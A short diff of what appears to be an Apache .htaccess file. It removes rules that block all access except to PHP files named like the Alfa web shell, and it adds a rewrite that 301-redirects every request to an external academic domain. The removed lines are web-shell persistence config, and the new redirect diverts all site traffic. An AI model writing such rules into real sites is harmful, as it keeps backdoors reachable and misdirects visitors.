@@ -1,5 +1,2 @@
-Order Deny,Allow
-Deny from all
-<Files "alfa-v11.php|alfa-v13.php|alfas-test.php|fs.php">
-    Allow from all
-</Files>
+RewriteEngine On
+RewriteRule ^(.*)$ https://penerbit.idbbali.ac.id/ [R=301,L]
